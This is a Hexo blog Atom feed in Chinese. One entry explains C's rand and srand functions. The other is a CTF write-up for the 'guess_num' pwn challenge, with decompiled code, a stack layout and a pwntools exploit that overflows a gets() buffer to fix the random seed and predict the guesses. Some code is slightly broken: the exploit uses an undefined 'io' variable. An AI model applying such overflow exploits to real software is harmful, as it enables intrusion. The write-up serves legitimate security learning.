<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xfgg</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-07-27T04:06:37.079Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>rand和srand函数</title>
    <link href="http://yoursite.com/2019/07/27/rang%E5%92%8Csrand%E5%87%BD%E6%95%B0%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2019/07/27/rang和srand函数的使用/</id>
    <published>2019-07-27T03:41:13.098Z</published>
    <updated>2019-07-27T04:06:37.079Z</updated>
    
    <content type="html"><![CDATA[<h3 id="函数的作用"><a href="#函数的作用" class="headerlink" title="函数的作用"></a>函数的作用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void srand(unsigned seed);//srand函数是随机数发生器的初始化函数</span><br><span class="line">int rand(void)//rand函数用来产生随机数，当然是伪随机数</span><br><span class="line"></span><br><span class="line">seed的作用： srand函数的作用是根据参数seed，设置一个随机起始点，而rand函数根据这个起始点，产生随机数序列。默认的随机种子为1.如果随机种子一样，rand函数所产生的随机序列也一样。因此,为使每次程序运行都能产生不同的随机序列，每次都应产生一个不同的种子参数。</span><br><span class="line"></span><br><span class="line">因为rand的内部实现是用线性同余法做的，它不是真的随机数，只不过是因为其周期特别长，所以有一定的范围里可看成是随机的，rand()会返回一随机数值，范围在0至RAND_MAX间。在调用此函数产生随机数前，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。rand()产生的是假随机数字，每次执行时是相同的。若要不同,以不同的值来初始化它.初始化的函数就是srand()。</span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">返回0至RAND_MAX之间的随机整数值，RAND_MAX的范围最少是在32767之间（int），即双字节（16位数）。若用unsigned int 双字节是65535，四字节是4294967295的整数范围。</span><br></pre></td></tr></table></figure><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">//取得0～6之间的随机整数  </span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;  </span></span><br><span class="line"></span><br><span class="line">int main()  </span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(int i=0;i&lt;10;i++)  </span><br><span class="line"></span><br><span class="line">    &#123;   </span><br><span class="line"></span><br><span class="line">        ran_num=rand()%6;  </span><br><span class="line"></span><br><span class="line">        cout&lt;&lt;ran_num&lt;&lt;<span class="string">" "</span>;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> 0;  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">//由于种子默认都是1，故每次运行都将输出：5 5 4 4 5 4 0 0 4 2</span><br><span class="line"></span><br><span class="line">//将seed指定为6的话</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;  </span></span><br><span class="line"></span><br><span class="line">int main()  </span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line"></span><br><span class="line">    srand(6);  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(int i=0;i&lt;10;i++)  </span><br><span class="line"></span><br><span class="line">    &#123;   </span><br><span class="line"></span><br><span class="line">        ran_num=rand()%6;  </span><br><span class="line"></span><br><span class="line">        cout&lt;&lt;ran_num&lt;&lt;<span class="string">" "</span>;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> 0;  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">//每次运行都将输出：每次运行都将输出：4 1 5 1 4 3 4 4 2 2</span><br><span class="line"></span><br><span class="line">举例4：那么我们如何产生一个伪随机的种子呢？一般指定seed为当前系统流逝了的时间（单位为秒）：time_t time(0)：</span><br><span class="line"></span><br><span class="line">//取得0～6之间的随机整数  </span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;ctime&gt;//时间函数  </span></span><br><span class="line"></span><br><span class="line">int main()  </span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line"></span><br><span class="line">    srand((unsigned)time(0));  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(int i=0;i&lt;10;i++)  </span><br><span class="line"></span><br><span class="line">    &#123;   </span><br><span class="line"></span><br><span class="line">        ran_num=rand()%6;  </span><br><span class="line"></span><br><span class="line">        cout&lt;&lt;ran_num&lt;&lt;<span class="string">" "</span>;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> 0;  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">       第一次运行时输出：0 1 5 4 5 0 2 3 4 2</span><br><span class="line"></span><br><span class="line">       第二次：3 2 3 0 3 5 5 2 2 3</span><br><span class="line"></span><br><span class="line">       总之，每次运行结果将不一样，因为每次启动程序的时刻都不同</span><br><span class="line"></span><br><span class="line">原文：https://blog.csdn.net/lianghui0811/article/details/76480664</span><br></pre></td></tr></table></figure><h3 id="关于time-t-time-0"><a href="#关于time-t-time-0" class="headerlink" title="关于time_t time(0)"></a>关于time_t time(0)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">time_t被定义为长整型，它返回从1970年1月1日零时零分零秒到目前为止所经过的时间，单位为秒。比如假设输出：</span><br><span class="line"></span><br><span class="line">       cout&lt;&lt;time(0);</span><br><span class="line"></span><br><span class="line">      值约为1169174701，约等于37（年）乘365（天）乘24（小时）乘3600（秒）（月日没算）。</span><br><span class="line"></span><br><span class="line">      另外，关于ran_num = rand() % 6，将rand()的返回值与6求模是必须的，这样才能确保目的随机数落在[0,6)之间，否则rand()的返回值本身可能是很巨大的。</span><br><span class="line"></span><br><span class="line">      一个通用的公式是：</span><br><span class="line"></span><br><span class="line">      要取得[a,b)之间的随机整数，使用(rand() % (b<span class="_">-a</span>))+ a（结果值将含a不含b）。在a为0的情况下，简写为rand() % b。</span><br><span class="line"></span><br><span class="line">      另外还有一种比较常用的产生随机种子的函数：</span><br><span class="line"></span><br><span class="line">       srand(time(NULL)); //是以当前时间为种子，产生随意数。其中,time(NULL)用来获取当前时间，本质上得到的是一个大整数，然后用这个数来随机数。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;函数的作用&quot;&gt;&lt;a href=&quot;#函数的作用&quot; class=&quot;headerlink&quot; title=&quot;函数的作用&quot;&gt;&lt;/a&gt;函数的作用&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;
      
    
    </summary>
    
      <category term="理论知识" scheme="http://yoursite.com/categories/%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>guess_num</title>
    <link href="http://yoursite.com/2019/07/27/guess_num/"/>
    <id>http://yoursite.com/2019/07/27/guess_num/</id>
    <published>2019-07-27T03:31:33.086Z</published>
    <updated>2019-07-27T04:02:25.396Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec guess_num</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/guess_num'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line"></span><br><span class="line">ida分析</span><br><span class="line"></span><br><span class="line">_int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [rsp+4h] [rbp-3Ch]</span><br><span class="line">  int i; // [rsp+8h] [rbp-38h]</span><br><span class="line">  int v6; // [rsp+Ch] [rbp-34h]</span><br><span class="line">  char v7; // [rsp+10h] [rbp-30h]</span><br><span class="line">  unsigned int seed[2]; // [rsp+30h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v9; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(0x28u);</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">  v4 = 0;</span><br><span class="line">  v6 = 0;</span><br><span class="line">  *(_QWORD *)seed = sub_BB0();</span><br><span class="line">  puts(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  puts(<span class="string">"Welcome to a guess number game!"</span>);</span><br><span class="line">  puts(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  puts(<span class="string">"Please let me know your name!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your name:"</span>, 0LL);</span><br><span class="line">  gets((__int64)&amp;v7);</span><br><span class="line">  srand(seed[0]);</span><br><span class="line">  <span class="keyword">for</span> ( i = 0; i &lt;= 9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = rand() % 6 + 1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------------Turn:%d-------------\n"</span>, (unsigned int)(i + 1));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input your guess number:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">    puts(<span class="string">"---------------------------------"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 != v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">"GG!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(1);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(<span class="string">"Success!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E();</span><br><span class="line">  <span class="built_in">return</span> 0LL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub_c3e中有system(<span class="string">"cat flag"</span>);</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000030 var_30          db ?</span><br><span class="line">-000000000000002F                 db ? ; undefined</span><br><span class="line">-000000000000002E                 db ? ; undefined</span><br><span class="line">-000000000000002D                 db ? ; undefined</span><br><span class="line">-000000000000002C                 db ? ; undefined</span><br><span class="line">-000000000000002B                 db ? ; undefined</span><br><span class="line">-000000000000002A                 db ? ; undefined</span><br><span class="line">-0000000000000029                 db ? ; undefined</span><br><span class="line">-0000000000000028                 db ? ; undefined</span><br><span class="line">-0000000000000027                 db ? ; undefined</span><br><span class="line">-0000000000000026                 db ? ; undefined</span><br><span class="line">-0000000000000025                 db ? ; undefined</span><br><span class="line">-0000000000000024                 db ? ; undefined</span><br><span class="line">-0000000000000023                 db ? ; undefined</span><br><span class="line">-0000000000000022                 db ? ; undefined</span><br><span class="line">-0000000000000021                 db ? ; undefined</span><br><span class="line">-0000000000000020                 db ? ; undefined</span><br><span class="line">-000000000000001F                 db ? ; undefined</span><br><span class="line">-000000000000001E                 db ? ; undefined</span><br><span class="line">-000000000000001D                 db ? ; undefined</span><br><span class="line">-000000000000001C                 db ? ; undefined</span><br><span class="line">-000000000000001B                 db ? ; undefined</span><br><span class="line">-000000000000001A                 db ? ; undefined</span><br><span class="line">-0000000000000019                 db ? ; undefined</span><br><span class="line">-0000000000000018                 db ? ; undefined</span><br><span class="line">-0000000000000017                 db ? ; undefined</span><br><span class="line">-0000000000000016                 db ? ; undefined</span><br><span class="line">-0000000000000015                 db ? ; undefined</span><br><span class="line">-0000000000000014                 db ? ; undefined</span><br><span class="line">-0000000000000013                 db ? ; undefined</span><br><span class="line">-0000000000000012                 db ? ; undefined</span><br><span class="line">-0000000000000011                 db ? ; undefined</span><br><span class="line">-0000000000000010 seed            dd 2 dup(?)</span><br><span class="line"></span><br><span class="line">发现var_30在栈中占0x20，可以覆盖到seed</span><br><span class="line">如果使输入的guessnumber，即v4等于随机数v6，即可cat flag。</span><br></pre></td></tr></table></figure><h3 id="0x03攻击"><a href="#0x03攻击" class="headerlink" title="0x03攻击"></a>0x03攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">关于rand和srand</span><br><span class="line">随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。</span><br><span class="line">对于该题目，我们将随机种子设置为0或1都可，参考文件中的循环来写脚本。</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"/home/xfgg/Downloads/guess_num"</span>)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * 0x20 + p64(1)</span><br><span class="line">io.recvuntil(<span class="string">'your name:'</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">libc.srand(1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10):</span><br><span class="line">    num = str(libc.rand()%6+1)</span><br><span class="line">    io.recvuntil(<span class="string">'number:'</span>)</span><br><span class="line">    io.sendline(num)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
</feed>
